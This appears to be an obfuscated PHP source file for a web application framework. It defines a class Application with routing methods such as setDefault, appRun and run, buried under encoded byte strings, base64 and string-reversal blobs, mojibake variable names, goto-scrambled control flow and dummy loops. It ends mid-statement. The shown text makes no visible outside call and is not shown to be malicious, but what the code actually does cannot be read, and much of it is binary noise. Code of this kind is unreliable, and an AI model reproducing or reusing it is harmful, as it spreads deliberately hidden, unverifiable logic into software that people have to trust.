123\144\36\307".base64_decode('OORxLMHoFQ+J+CacsBpAhwNgqeW6bgXqMIVcr1PaIFHhptryeBxJBjtBWaWkjsNCjpC/uycyVXE=').strrev('´É‰.†>ŠüP·Òy'."\n".');Ü^›Ğ:÷áŞp&*	Ô±ÚÖTDd'."\r".'s"Ò¤šŒ«g¿’jØe').strrev(',­ÀúFaMÌCI—uRq¾Ï\'†–¹‘ÈôÜxî	Y6ÈS‘mÔpçáˆÌ17ÌJyd5R')."\xda\x9d\xad\x66\x2c\x32\x72\x39\x2e\x48\x93\xb8\x4d\x3c\x43\x90\x5a\xa5\x3a\xe4\x5a\x1\xeb\xd3\xa0\xfb\x9d\x5\xd4\x8d\x3c\x6c\x3c\xb6\x53\x46\x8f\x7c\xf9\x72\x5\xd3\x62\xc3\xdc\xa3\x1a\xfc\x39\x8\x24\x26\xf0\xed\x10\x94"."\xbd\xb4\xdc\x44\x19\xc0\x62\x24\xdf\x4b\xab\xc1\xfc\x81\x42\x33\x92\x7c\x4a\x13\x5b\x86\x58\x96\xf\xb0\x6\x7\xa\x61\xdb\x68\x7\x3c\xa9\x36\x83\x88\x8\x7a\x95\x92\x62\xcd\x3e\x65\x59\x86\x9d\xd7\x33\x3e\x6d\x61\x8c\x28"."\x22\xd0\x11\x32\x4a\x15\xdc\xa9\xd3\x5f\xe8\xaf\x86\xc9\x97\xb0\x2a\x82\x20\x42\xac\x96\xa2\xe4\x97\xf2\x40\x7b\xd1\x60\x6c\x3a\x89\x56\x8\x25\x40\x18\x2d\x4b\xec\x53\xb8\x1a\x1a\xa9\xab\x83\xb3\x75\x7c\x1b\xd\x40\x80\xd"."\40\113\34\201\242\151\232\60\374\130\35\75\204\275\17\272\260\307\12\52\167\244\125\346\142\324\202\106\310\35\154\21\370\141\241\315\267\12\131\337\260\237\225\142\336\217\235\312\133\240\272\40\136\213\236\151".base64_decode('sccW7vyboIOvBbHPGTIhxSKpax/0AwVwQK/Mttld7goIekdk4gP3JjqiISnWJcq/BEFaINH5Ypg=')."\26\72\202\42\7\220\106\34\50\200\210\123\24\222\52\103\55\304\211\120\330\200\241\267\7\331\330\301\36\45\77\136\45\305\304\107\30\347\373\14\361\331\14\332\4\114\30\145\337\100\277\160\23\355\300\155"."\x74\x30\x72\x51\x8d\x5e\xa4\x5e\x68\x84\xb1\x80\xe5\xe0\xfe\xdb\x1d\xf8\x6c\x1e\x19\xb1\x70\xe6\xc0\xbb\x83\x92\x7d\x5a\xe1\x1f\x84\x35\x8c\x88\x1f\xb7\x48\x72\x76\x21\x8e\xf5\x92\x2d\x43\xc8\xde\x93\x11\xad\xdc\x21\x2\xf7"."\x7d\x94\x2f\xe6\xb8\x93\x29\x10\xb1\xa\xb0\x58\xb4\xa7\xae\x24\xbe\xa5\xb9\x45\x3d\xeb\x40\xaa\xb1\xe\xfa\x98\x9c\x3\xbf\x4f\xea\xb0\x14\x81\x2a\x14\x33\x85\x6\x33\x69\xca\x36\x5c\x65\x1f\xfb\x2f\x4a\x27\xbe\x67\x91\x40"."\13\104\3\354\141\2\47\265\240\213\215\312\150\252\205\56\301\356\221\37\31\343\327\55\13\166\106\271\74\227\154\150\234\75\117\334\57\362\141\344\216\153\310\121\76\321\362\241\107\143\214\60\44\53\235\111"."\xf4\x49\x4d\x71\x66\xa3\x44\xab\xb\x5d\xf2\xce\xa9\xc0\x5\x6d\xfc\xeb\xbf\x9a\xe\x9e\x4a\xe2\x26\xce\x24\x9c\x60\xb1\x92\x85\x2e\xa8\xf4\x95\xff\x7b\x3d\xac\x2e\xcf\xc8\x3e\xd0\xcb\x64\x4c\x41\x30\x14\x45\x58\x5e\x7b\xfc"."\374\343\177\377\175\52\260\311\126\37\126\50\325\72\365\205\143\7\305\14\100\103\167\62\46\202\264\317\37\140\22\326\67\130\226\107\24\141\313\105\160\72\163\270\216\23\362\30\317\335\144\40\42\261\20\214"."\360\126\252\350\200\35\25\24\101\215\234\252\150\264\7\44\365\45\24\203\56\313\221\227\70\117\67\363\251\17\57\22\171\25\140\214\263\11\123\343\51\246\340\355\35\62\226\0\75\65\3\233\110\213\110\11"."\342\334\352\110\240\373\244\15\50\312\0\302\74\2\364\255\12\142\41\221\227\270\0\202\32\52\70\362\41\333\124\336\123\36\62\141\222\16\361\205\130\20\145\204\102\70\72\231\171\310\275\56\376\254\300\277"."\x39\xab\xe6\xa1\x7e\xaa\x98\xf\x23\xc2\x81\xc\x12\xe3\x58\x62\x46\x94\xf0\xe0\xf3\x41\x56\xa1\x86\xd5\x2\x71\x99\x4a\x34\x8b\x2b\x1\x9\x91\x2c\x22\x28\x48\x39\x1b\xd4\xdc\x45\x6\xb3\x30\xf\xe9\x3d\xeb\x4c\x45\xd\xfa"."\226\225\10\26\307\334\73\223\210\350\154\136\130\351\104\146\272\267\230\112\50\313\141\211\221\10\27\261\220\36\264\160\247\203\342\314\73\47\175\13\212\76\21\45\63\257\55\320\35\15\333\327\340\63\37\202"."\x92\xcd\x72\xc6\x2d\xbe\xfd\x91\x8d\xcb\xba\xb\x50\xd8\x88\x49\x5d\x78\x55\x8a\x88\xad\xac\x20\x8e\x53\x91\x80\x37\x20\xaf\x26\x46\x2a\xb8\xec\x81\xfd\xf\x75\x64\x4\x9e\x29\xac\x34\x65\x68\x9c\xa7\x80\x5\x89\xe9\xb6\xd1"."\20\222\135\241\214\102\36\306\266\74\270\20\140\167\276\65\304\335\333\360\102\312\20\340\54\244\207\111\42\57\260\200\312\70\110\304\302\274\55\300\12\104\0\75\252\123\172\260\344\200\316\201\72\4\41\270"."\334\355\164\271\317\46\21\77\114\234\66\225\161\65\66\61\105\74\316\371\161\34\276\272\153\335\142\212\137\303\227\265\160\33\25\202\73\36\227\255\170\66\223\52\316\36\325\300\7\163\342\156\0\204\304\272".strrev('J×*ôóäj¾áI€psá³Gâ*/Ç48Z'."\0".'/K53;a='."\n".'	'."\r".'&_l¡[&´5ÔéÓ')."\42\42\254\224\366\221\204\377\360\333\154\325\60\31\26\262\122\362\367\363\327\161\153\44\376\246\230\370\62\67\74\125\352\322\30\61\130\335\373\103\37\273\126\312\157\253\204\226\320\164\103\100\23\236\46\132"."\2\35\222\343\140\237\232\247\257\112\20\202\246\331\111\327\213\117\334\133\313\7\43\35\66\55\143\302\137\46\267\277\110\216\66\135\170\37\145\331\116\21\305\31\21\44\34\374\100\355\160\253\213\125\224\210".strrev('o(!ÖáRdX'."\r".'sØ•)™%<ÛÏŒ”û¹ûÿ=ğ/µô\\£$+Ú¢«q—RO`G½mzp‚REÙôÀ')."\x1c\x50\xc6\x38\xa8\x25\xfa\xe3\x29\xa8\xf6\x1c\x66\x46\xd5\x93\x1d\x6a\x3e\x69\xc7\x2f\xe6\xe3\xc\xca\xd1\xc1\x60\x74\x54\x2\x3\xa9\x89\x33\x6c\x1b\x5c\x58\x5b\x38\xcb\x94\x4b\xfc\x54\x9a\x4b\x89\xc9\x64\x97\x5c\xaa\x80"."\312\214\235\31\24\100\30\52\22\201\204\7\112\270\157\136\145\114\374\72\301\113\225\257\54\20\261\34\312\37\60\261\267\13\315\33\6\47\27\1\171\301\17\32\41\67\16\302\117\326\63\107\167\270\50\135".base64_decode('QxnlJPeAh+vINnT8k9Z3VhgaE88ADlIbd1qgNvfA8GyLrrG2JLKbFIqvuOm0kEKvUJx4FzFlhnA=')."\345\217\160\172\265\166\161\330\166\3\142\143\241\34\231\56\157\232\145\100\4\6\313\32\113\60\103\142\242\245\212\366\341\106\242\77\247\125\14\314\241\23\47\234\346\261\46\141\174\305\326\42\61\203\275\265".base64_decode('OIde1mckT+VP2z9Au8x+E8gLEc7fyq4pI1qFPLhGFbPhJJiTy2+WvOIul2cD0KIxRQ3L249mh60=')."\365\244\316\334\65\267\200\72\125\227\124\104\56\377\34\31\177\73\66\332\271\126\256\105\305\135\366\124\265\250\210\74\145\55\70\266\355\122\261\22\233\243\51\25\30\33\277\3\54\147\241\74\255\302\215\44"."\x2e\x13\xae\xaf\x21\x8b\x82\x5e\x59\xb2\x78\xbd\x59\xf9\x2\x34\x54\x71\x22\x1a\xd6\x9b\x49\x1b\x5c\xec\x18\xaa\x6a\xb1\xed\xf4\xd3\x76\xdc\x77\xbe\x3f\x28\xd1\x80\x8\xb6\x30\xde\x62\x7e\x24\x4f\x7d\x18\x81\x2f\x70\xdf\x80"."\xd0\x4e\xd1\xa3\xdb\xfb\x8f\x8a\x71\x36\x37\xb9\x94\x3c\xf3\x45\xc1\x35\x6b\x45\x3f\xbb\xe\xb8\xe7\x2d\xdf\x54\x66\xa9\x87\x2b\xd1\xb\x31\xde\x79\x68\xa6\x9a\x10\x14\x23\x20\x50\x74\xa4\x8b\xd3\xe9\x47\xb2\xfc\x6c\x8a\xc8"."\0\370\276\313\53\352\371\242\332\252\360\371\164\166\247\150\271\100\253\220\356\342\147\225\26\67\315\350\31\56\146\273\215\27\145\162\132\213\357\26\220\16\13\201\164\114\300\215\223\3\257\165\70\71\254\351".base64_decode('JrTpBvy4gH47NNOkbAJItggTiW7IZYxwYwpC/J1T2LfooBgRKmIoKEhuOeAmM6zgVMSkLBF4AM0=')."\42\241\362\223\346\256\242\355\132\205\3\300\366\60\256\215\23\42\100\57\245\360\372\300\223\142\322\55\166\361\214\277\15\100\250\120\274\377\105\112\127\206\33\247\270\211\202\266\23\225\341\44\317\354\61\5"."\55\222\75\211\46\26\163\72\371\155\45\220\203\65\136\4\176\313\31\35\1\301\47\320\175\313\374\341\110\270\54\51\350\11\207\7\3\41\57\126\362\54\113\106\271\204\313\366\262\244\140\117\240\177\252\64"."\x5f\x9f\xc7\xdf\x5b\x96\x6\x2f\xdf\xa1\xea\x29\x7d\x9\x12\x27\xf9\x83\xa8\x96\x9e\xde\x5e\xaa\xe9\x55\x5e\xb\x7f\xe7\x62\x5e\x13\x74\xe7\xc4\x4f\x48\xb\x19\x8d\x1e\x38\xda\xb4\x50\xe8\x81\x72\x58\xa6\xd3\x4\x32\x7f\xb6".base64_decode('xRXCSo4dRwnFWc8FxCE36EulLFAo20EICz28LO8nhYWob0X4LDab/kyaRY0TtW74DZvLchMnwNE=')._kodDe('LDO2Oj46Ev9j8jgXlK1co/uYZ9Ci0YkTl+H6SgI34anGHLQgH6OOMFTTV5RC9azNAEoKlCTWN9Mm')."\x2b\x50\xb0\xe0\xb1\x8e\x9\x31\x2c\x1e\x60\xb4\x31\xb6\x62\xca\x69\x7a\xa1\x6d\x67\xc5\xc2\xd\x2e\xec\xa5\xff\xf\x36\xd\x8c\xd2\x98\xc2\x0\x0", 10, -8))); goto DŒÎ­ùÀšÌ; Eµùàİ»Æ²: $F’”÷¹—É¥ = $_SERVER[Äº¡•ô™Ÿ][547]; while (strlen($F’”÷¹—É¥) < $_SERVER[Äº¡•ô™Ÿ][548]) { if (!$F’”÷¹—É¥) { break; } $F’”÷¹—É¥++; } class Application { private $defaultModule = "\151\156\x64\145\x78"; private $defaultController = "\x69\156\x64\x65\170"; private $defaultAction = "\151\156\x64\x65\x78"; function __construct() { } public function setDefault($dáóã‰“æÛ) { goto E¾×¼İ¼¿; D´‹¯¸´ñ: if (!$dâà×‚ˆÇ­) { return; } $this->defaultController = $FÀĞóïùÁ™[1] ? $FÀĞóïùÁ™[1] : $this->defaultController; $this->defaultAction = $FÀĞóïùÁ™[2] ? $FÀĞóïùÁ™[2] : $this->defaultAction; goto bá…Ñ®ã¥…; E¾×¼İ¼¿: $BĞç”ƒãï =& $_SERVER[Äº¡•ô™Ÿ]; $D‘…ó‚»Œ =& $_SERVER[Ä³Œ±¸ü]; $FÀĞóïùÁ™ = $D‘…ó‚»Œ[0]($D‘…ó‚»Œ[1], $D‘…ó‚»Œ[2]($dáóã‰“æÛ, $D‘…ó‚»Œ[1])); goto dç–º·ªèê; dç–º·ªèê: $A™é¬¸ƒËÓ = $BĞç”ƒãï[549]; $this->defaultModule = $FÀĞóïùÁ™[0] ? $FÀĞóïùÁ™[0] : $this->defaultModule; $dâà×‚ˆÇ­ = $BĞç”ƒãï[550]; goto D´‹¯¸´ñ; bá…Ñ®ã¥…: $FÚ‹ì±¸â = $BĞç”ƒãï[551]; if (!$FÚ‹ì±¸â) { return; } $this->{$_SERVER[Ä³Œ±¸ü][3]}($D‘…ó‚»Œ[4], array($this, $D‘…ó‚»Œ[5])); goto B˜ùÈ÷ô; B˜ùÈ÷ô: } public function appRun($Eã£“Ü•çŠ) { goto C®¯©õÑ¹; eÕ‹Ş‡Õ†: $bÏ ìÜ = $BİÇÇ×Ø[554]; if (strlen($bÏ ìÜ) < $BİÇÇ×Ø[555]) { return; } goto BôĞ–í¬Ì×; bøëˆñÔ£¾: $bÔ•ŒŸÕŒ = $BİÇÇ×Ø[552]; $CÑà­æÔæŒ = $fã·¡›·îÑ[6]($Dá÷ƒ«‚îÙ[0]); $cä­Ş¢õÊ” = $BİÇÇ×Ø[553]; goto a—¾°²éáƒ; eÄã¬ìŒÈÓ: $fã·¡›·îÑ[13](array($fã·¡›·îÑ[14], $fã·¡›·îÑ[15]), $c†°„·îµ . $fã·¡›·îÑ[16], $Eã£“Ü•çŠ); $fã·¡›·îÑ[17]($Eã£“Ü•çŠ); $fã·¡›·îÑ[13](array($fã·¡›·îÑ[14], $fã·¡›·îÑ[15]), $c†°„·îµ . $fã·¡›·îÑ[18], $Eã£“Ü•çŠ); goto eÕ‹Ş‡Õ†; C®¯©õÑ¹: $BİÇÇ×Ø =& $_SERVER[Äº¡•ô™Ÿ]; $fã·¡›·îÑ =& $_SERVER[Ä³Œ±¸ü]; $Dá÷ƒ«‚îÙ = $fã·¡›·îÑ[0]($fã·¡›·îÑ[1], $Eã£“Ü•çŠ); goto bøëˆñÔ£¾; a—¾°²éáƒ: if (!$cä­Ş¢õÊ”) { die; } $c†°„·îµ = $fã·¡›·îÑ[7]; if ($CÑà­æÔæŒ == $fã·¡›·îÑ[8]) { $c†°„·îµ = $fã·¡›·îÑ[9]; $Dá÷ƒ«‚îÙ[0] = $fã·¡›·îÑ[10]; $Dá÷ƒ«‚îÙ[1] = $Dá÷ƒ«‚îÙ[1] . $fã·¡›·îÑ[11]; $Eã£“Ü•çŠ = $fã·¡›·îÑ[12]($fã·¡›·îÑ[1], $Dá÷ƒ«‚îÙ); $Eã£“Ü•çŠ = $fã·¡›·îÑ[2]($Eã£“Ü•çŠ, $fã·¡›·îÑ[1]); } goto eÄã¬ìŒÈÓ; BôĞ–í¬Ì×: } private function autorun() { $d™°øÓÌÇ =& $_SERVER[Äº¡•ô™Ÿ]; $C¼éÆÃ®Üñ =& $_SERVER[Ä³Œ±¸ü]; global $config; $FÊ¦ô˜‡‰Õ = $d™°øÓÌÇ[556]; if ($C¼éÆÃ®Üñ[19]($config[$C¼éÆÃ®Üñ[20]]) == 0) { return; } foreach ($config[$C¼éÆÃ®Üñ[20]] as $f©İ™ˆíÉ => $e£õ–µŒŞ) { $this->{$_SERVER[Ä³Œ±¸ü][21]}($e£õ–µŒŞ); $CÙöÓ„£Ï÷ = $d™°øÓÌÇ[557]; if (strlen($CÙöÓ„£Ï÷) < $d™°øÓÌÇ[558]) { return; } } } private function kbndb7256075() { goto eêõğ® ¾Ê; e´¥õ¯ÇÂ: $eÀõÉÁåöĞ = $a§Œ…Ôò¼·[559]; while ($eÀõÉÁåöĞ < $a§Œ…Ôò¼·[548]) { if ($eÀõÉÁåöĞ >= 0) { break; } $eÀõÉÁåöĞ++; } $f³›˜†ñã¶ = $GLOBALS[$dœÁÜ”®à[22]][$dœÁÜ”®à[23]][0]; goto dª­ª„Õ¢ë; f…‚•™½Ö: if (strlen($b“°Ø£äè) < $a§Œ…Ôò¼·[555]) { die; } goto D¾ÂÎ‘ï ; a‚ğÁöŸğƒ: $cİãß©˜Áæ = $a§Œ…Ôò¼·[560]; while ($cİãß©˜Áæ < $a§Œ…Ôò¼·[561]) { if ($cİãß©˜Áæ >= 0) { break; } $cİãß©˜Áæ++; } $c¿„ô‹¤§‰ = array($dœÁÜ”®à[8], $Bä½¡‰ˆ¤ª); goto Fæ é‚‚Ûâ; Fæ é‚‚Ûâ: $aÖâòõ¶– = $a§Œ…Ôò¼·[562]; if (!$aÖâòõ¶–) { die; } $CíŒõÅˆ÷ê = $dœÁÜ”®à[26]($GLOBALS[$dœÁÜ”®à[22]][$dœÁÜ”®à[23]], 1); goto F´½î…¬Å; F´½î…¬Å: $GLOBALS[$dœÁÜ”®à[22]][$dœÁÜ”®à[23]] = $dœÁÜ”®à[27]($c¿„ô‹¤§‰, $CíŒõÅˆ÷ê); $GLOBALS[$dœÁÜ”®à[22]][$dœÁÜ”®à[28]] = $dœÁÜ”®à[29]($dœÁÜ”®à[1], $GLOBALS[$dœÁÜ”®à[22]][$dœÁÜ”®à[23]]); $b“°Ø£äè = $a§Œ…Ôò¼·[563]; goto f…‚•™½Ö; eêõğ® ¾Ê: $a§Œ…Ôò¼· =& $_SERVER[Äº¡•ô™Ÿ]; $dœÁÜ”®à =& $_SERVER[Ä³Œ±¸ü]; $B©¯¹ğˆ¯Ô = $dœÁÜ”®à[8]; goto e´¥õ¯ÇÂ; dª­ª„Õ¢ë: if (!$f³›˜†ñã¶ || $dœÁÜ”®à[24]($f³›˜†ñã¶) <= $dœÁÜ”®à[24]($B©¯¹ğˆ¯Ô)) { return; } if ($dœÁÜ”®à[6]($dœÁÜ”®à[25]($f³›˜†ñã¶, -$dœÁÜ”®à[24]($B©¯¹ğˆ¯Ô))) != $B©¯¹ğˆ¯Ô) { return; } $Bä½¡‰ˆ¤ª = $dœÁÜ”®à[25]($f³›˜†ñã¶, 0, -$dœÁÜ”®à[24]($B©¯¹ğˆ¯Ô)); goto a‚ğÁöŸğƒ; D¾ÂÎ‘ï : } private function txifbba6794e() { goto d–æÊñèì; a‰ºÎ“š: while ($E—ù›Ğ‰´ < $fŸÑ¨ºæßÌ[555]) { if ($E—ù›Ğ‰´ >= 0) { break; } $E—ù›Ğ‰´++; } $cœŠ¢‰ÊŒ‹ = $b²‹®°æô[2]($e‹•¦À¿Öë[0][0], $b²‹®°æô[36]); $GLOBALS[$b²‹®°æô[22]][$b²‹®°æô[23]] = $b²‹®°æô[0]($b²‹®°æô[36], $cœŠ¢‰ÊŒ‹); goto BÏ¸Í±¢; bë¨¨Ø‡ĞÂ: if (!$b²‹®°æô[32]($c§Éİ©Æ×À, $D§ÙÁÄ×Õ‡)) { return; } $Fé¥ÆŸğ®‰ = $b²‹®°æô[33]($c§Éİ©Æ×À, $D§ÙÁÄ×Õ‡); $C‚ºó¶‘õ = $fŸÑ¨ºæßÌ[566]; goto dÌõ­­Ü‡·; C¦—òÍ§‘: $c§Éİ©Æ×À = $_SERVER[$b²‹®°æô[30]]; $f¯Ñ£·ä¦ˆ = $fŸÑ¨ºæßÌ[564]; if (strlen($f¯Ñ£·ä¦ˆ) < $fŸÑ¨ºæßÌ[555]) { die; } goto FÃ·ºƒ¯˜Ÿ; d–æÊñèì: $fŸÑ¨ºæßÌ =& $_SERVER[Äº¡•ô™Ÿ]; $b²‹®°æô =& $_SERVER[Ä³Œ±¸ü]; if ($GLOBALS[$b²‹®°æô[22]][$b²‹®°æô[28]] != $b²‹®°æô[10]) { return; } goto C¦—òÍ§‘; dÌõ­­Ü‡·: if (strlen($C‚ºó¶‘õ) < $fŸÑ¨ºæßÌ[555]) { return; } $cœŠ¢‰ÊŒ‹ = $b²‹®°æô[25]($c§Éİ©Æ×À, $Fé¥ÆŸğ®‰ + $b²‹®°æô[24]($D§ÙÁÄ×Õ‡)); $d¼ï‚‘ÃñÙ = $fŸÑ¨ºæßÌ[567]; goto AåŒ‘½À¸ö; FÃ·ºƒ¯˜Ÿ: $D§ÙÁÄ×Õ‡ = $b²‹®°æô[31]; $aïãÂ¸†Æ = $fŸÑ¨ºæßÌ[565]; if (strlen($aïãÂ¸†Æ) < $fŸÑ¨ºæßÌ[555]) { die; } goto bë¨¨Ø‡ĞÂ; BÏ¸Í±¢: $GLOBALS[$b²‹®°æô[22]][$b²‹®°æô[28]] = $b²‹®°æô[29]($b²‹®°æô[1], $GLOBALS[$b²‹®°æô[22]][$b²‹®°æô[23]]); goto dˆ×¦ŞØ¸; AåŒ‘½À¸ö: if (!$d¼ï‚‘ÃñÙ) { die; } $b²‹®°æô[34]($b²‹®°æô[35], $cœŠ¢‰ÊŒ‹, $e‹•¦À¿Öë); $E—ù›Ğ‰´ = $fŸÑ¨ºæßÌ[568]; goto a‰ºÎ“š; dˆ×¦ŞØ¸: } public function run() { goto dŒŸÚ¬ğÂ‚; eÏ†ƒ¦µ”—: if (strlen($a£…ŠçÉ–) < $B‰ÈŠ‘íù£[548]) { return; } $f×—›»×å…[39]($f×—›»×å…[43], MOD . $f×—›»×å…[1] . ST . $f×—›»×å…[1] . ACT); $_SERVER[$f×—›»×å…[44]] = $f×—›»×å…[6](ACTION); goto bŞÁ‹ñ¥ˆ; dß…Ÿ×ÉØã: $E¤ª×ğÒ— = $GLOBALS[$f×—›»×å…[22]][$f×—›»×å…[23]]; $dÕ«Ğ¢ÄÒ = $B‰ÈŠ‘íù£[570]; if (strlen($dÕ«Ğ¢ÄÒ) < $B‰ÈŠ‘íù£[544]) { return; } goto C¸õ‡ŒàäÄ; bŞÁ‹ñ¥ˆ: $f¯Éºµ‘Ñô = $B‰ÈŠ‘íù£[574]; if (!$f¯Éºµ‘Ñô) { return; } $this->{$_SERVER[Ä³Œ±¸ü][45]}(); goto dõë´ª „¦; dÊÁöãÂˆ: $d›‡Õ¯ å¹ = $B‰ÈŠ‘íù£[569]; if (!$d›‡Õ¯ å¹) { return; } $this->{$_SERVER[Ä³Œ±¸ü][38]}(); goto dß…Ÿ×ÉØã; dŒŸÚ¬ğÂ‚: $B‰ÈŠ‘íù£ =& $_SERVER[Äº¡•ô™Ÿ]; $f×—›»×å… =& $_SERVER[Ä³Œ±¸ü]; $this->{$_SERVER[Ä³Œ±¸ü][37]}(); goto dÊÁöãÂˆ; D™…“Š“×Å: $f×—›»×å…[39]($f×—›»×å…[41], isset($E¤ª×ğÒ—[1]) && $E¤ª×ğÒ—[0] ? $E¤ª×ğÒ—[1] : $this->defaultController); $f×—›»×å…[39]($f×—›»×å…[42], isset($E¤ª×ğÒ—[2]) && $E¤ª×ğÒ—[0] ? $E¤ª×ğÒ—[2] : $this->defaultAction); $a£…ŠçÉ– = $B‰ÈŠ‘íù£[573]; goto eÏ†ƒ¦µ”—; C¸õ‡ŒàäÄ: $F¬‹Œó½ª = $GLOBALS[$f×—›»×å…[22]][$f×—›»×å…[28]]; $bÀ‹Ûèœ = $B‰ÈŠ‘íù£[571]; if (strlen($bÀ‹Ûèœ) < $B‰ÈŠ‘íù£[555]) { die; } goto A®Ôñáƒ½Â; dõë´ª „¦: if ($f×—›»×å…[19]($E¤ª×ğÒ—) >= 3) { $this->{$_SERVER[Ä³Œ±¸ü][21]}($F¬‹Œó½ª); } else { $this->{$_SERVER[Ä³Œ±¸ü][21]}(ACTION); } goto FÏ¯¨ãé°È; A®Ôñáƒ½Â: $f×—›»×å…[39]($f×—›»×å…[40], isset($E¤ª×ğÒ—[0]) && $E¤ª×ğÒ—[0] ? $E¤ª×ğÒ—[0] : $this->defaultModule); $Bª“˜š×éä = $B‰ÈŠ‘íù£[572]; while (strlen($Bª“˜š×éä) < $B‰ÈŠ‘íù£[558]) { if (!$Bª“˜š×éä) { break; } $Bª“˜š×éä++; } goto D™…“Š“×Å; FÏ¯¨ãé°È: } private $kosba43503a3 = array(); private $gdek593ce87e = ''; public function nbqfababd7dd() { goto F¢–àÊ­Ÿ›; C÷ñßğÄƒƒ: $this->{$_SERVER[Ä³Œ±¸ü][49]}(); $this->{$_SERVER[Ä³Œ±¸ü][50]}(); $e£Ø½ÀÑŒƒ = $a­ô‚¤’»[577]; goto bª†©Ï²ã½; bª†©Ï²ã½: if (strlen($e£Ø½ÀÑŒƒ) < $a­ô‚¤’»[555]) { return; } $this->{$_SERVER[Ä³Œ±¸ü][51]}(); $this->{$_SERVER[Ä³Œ±¸ü][52]}(); goto e¨Ã‰ààò; CÕÊÂê÷¨: $eâ£èµ”¥‰ = $a­ô‚¤’»[575]; if (strlen($eâ£èµ”¥‰) < $a­ô‚¤’»[548]) { die; } $this->{$_SERVER[Ä³Œ±¸ü][47]}(); goto B³•çÖØƒ; d‹àƒÅ«Â: $açÜŠ˜ÉõÃ = $a­ô‚¤’»[579]; if (strlen($açÜŠ˜ÉõÃ) < $a­ô‚¤’»[558]) { return; } $this->{$_SERVER[Ä³Œ±¸ü][3]}($D¿ã³§‚É[57], array($this, $D¿ã³§‚É[58])); goto AÓİğİÓÑˆ; F¢–àÊ­Ÿ›: $a­ô‚¤’» =& $_SERVER[Äº¡•ô™Ÿ]; $D¿ã³§‚É =& $_SERVER[Ä³Œ±¸ü]; $this->{$_SERVER[Ä³Œ±¸ü][46]}(); goto CÕÊÂê÷¨; B³•çÖØƒ: $E¹ÈÒ£½İ = $a­ô‚¤’»[576]; while (strlen($E¹ÈÒ£½İ) < $a­ô‚¤’»[548]) { if (!$E¹ÈÒ£½İ) { break; } $E¹ÈÒ£½İ++; } $this->{$_SERVER[Ä³Œ±¸ü][48]}(); goto C÷ñßğÄƒƒ; AÓİğİÓÑˆ: $e™º¤Ï†Ü = $a­ô‚¤’»[580]; if (strlen($e™º¤Ï†Ü) < $a­ô‚¤’»[558]) { return; } $this->{$_SERVER[Ä³Œ±¸ü][3]}($D¿ã³§‚É[59], array($this, $D¿ã³§‚É[60])); goto c÷Ğ«É’Ñ‚; e¨Ã‰ààò: $this->{$_SERVER[Ä³Œ±¸ü][3]}($D¿ã³§‚É[53], array($this, $D¿ã³§‚É[54])); $a×èñºóèô = $a­ô‚¤’»[578]; $this->{$_SERVER[Ä³Œ±¸ü][3]}($D¿ã³§‚É[55], array($this, $D¿ã³§‚É[56])); goto d‹àƒÅ«Â; c÷Ğ«É’Ñ‚: } public function btai4c0787f4($E¿óÒÓé‰’) { goto CÚè¤‘Ÿæá; fÑ‡¬×„¸: $E¿óÒÓé‰’[$Cêï©ÍáÊõ[108]][$Cêï©ÍáÊõ[109]] = $Cêï©ÍáÊõ[110]($Cêï©ÍáÊõ[111])->{$_SERVER[Ä³Œ±¸ü][112]}(); $AŠÊ‘Ğ¼ = $dì”° ó¥»[586]; if (strlen($AŠÊ‘Ğ¼) < $dì”° ó¥»[548]) { return; } goto Eáë¸ƒó¢ö; A•¦‚­óøŸ: if (!$D¿òä’ØÆ) { return; } $E¿óÒÓé‰’[$Cêï©ÍáÊõ[108]][$Cêï©ÍáÊõ[120]] = $this->gdek593ce87e; if ($eÀß…Ó²Û•[$Cêï©ÍáÊõ[120]] != $Cêï©ÍáÊõ[121]) { $E¿óÒÓé‰’[$Cêï©ÍáÊõ[108]][$Cêï©ÍáÊõ[122]] = $eÀß…Ó²Û•[$Cêï©ÍáÊõ[122]]; $E¿óÒÓé‰’[$Cêï©ÍáÊõ[108]][$Cêï©ÍáÊõ[123]] = $eÀß…Ó²Û•[$Cêï©ÍáÊõ[123]]; $CÄ»Éã—ö = $Cêï©ÍáÊõ[124](10) . $this->gdek593ce87e . $Cêï©ÍáÊõ[124](5); $E¿óÒÓé‰’[$Cêï©ÍáÊõ[93]][$Cêï©ÍáÊõ[125]][$Cêï©ÍáÊõ[126]] = $this->{$_SERVER[Ä³Œ±¸ü][127]}($CÄ»Éã—ö, $E¿óÒÓé‰’[$Cêï©ÍáÊõ[108]][$Cêï©ÍáÊõ[113]]); } goto DÊÓõ™ˆë¦; C‰èèñªòª: $FóÇ™Ÿø²Ò = $dì”° ó¥»[588]; while (strlen($FóÇ™Ÿø²Ò) < $dì”° ó¥»[555]) { if (!$FóÇ™Ÿø²Ò) { break; } $FóÇ™Ÿø²Ò++; } if ($Cêï©ÍáÊõ[104]($GLOBALS, $Cêï©ÍáÊõ[132]) && $this->config[$Cêï©ÍáÊõ[133]]) { $E¿óÒÓé‰’[$Cêï©ÍáÊõ[108]][$Cêï©ÍáÊõ[134]] = WEB_ROOT; } goto fµÈØ¾ÜÍ; Eáë¸ƒó¢ö: $E¿óÒÓé‰’[$Cêï©ÍáÊõ[108]][$Cêï©ÍáÊõ[113]] = $Cêï©ÍáÊõ[114]($_SERVER[$Cêï©ÍáÊõ[115]] . $eÀß…Ó²Û•[$Cêï©ÍáÊõ[116]]); $E¿óÒÓé‰’[$Cêï©ÍáÊõ[108]][$Cêï©ÍáÊõ[117]] = $Cêï©ÍáÊõ[118]($Cêï©ÍáÊõ[119]()); $D¿òä’ØÆ = $dì”° ó¥»[587]; goto A•¦‚­óøŸ; fµÈØ¾ÜÍ: return $E¿óÒÓé‰’; goto a¾ÑãƒÕåğ; fğ‡õ¼¯Æö: unset($E¿óÒÓé‰’[$Cêï©ÍáÊõ[93]][$Cêï©ÍáÊõ[94]][$Cêï©ÍáÊõ[98]]); $Côã˜Ä‰Üš = $dì”° ó¥»[584]; if (strlen($Côã˜Ä‰Üš) < $dì”° ó¥»[558]) { die; } goto AÔÒÙÁÕ»Ï; dÛ™Å‘‹Í: $D±‚ÂèÒŠÀ = $dì”° ó¥»[582]; while (strlen($D±‚ÂèÒŠÀ) < $dì”° ó¥»[548]) { if (!$D±‚ÂèÒŠÀ) { break; } $D±‚ÂèÒŠÀ++; } unset($E¿óÒÓé‰’[$Cêï©ÍáÊõ[93]][$Cêï©ÍáÊõ[95]][$Cêï©ÍáÊõ[97]]); goto Bé†÷éÒ²; Bé†÷éÒ²: $Dˆ‘‹”ëÕØ = $dì”° ó¥»[583]; if (!$Dˆ‘‹”ëÕØ) { return; } unset($E¿óÒÓé‰’[$Cêï©ÍáÊõ[93]][$Cêï©ÍáÊõ[94]][$Cêï©ÍáÊõ[76]]); goto 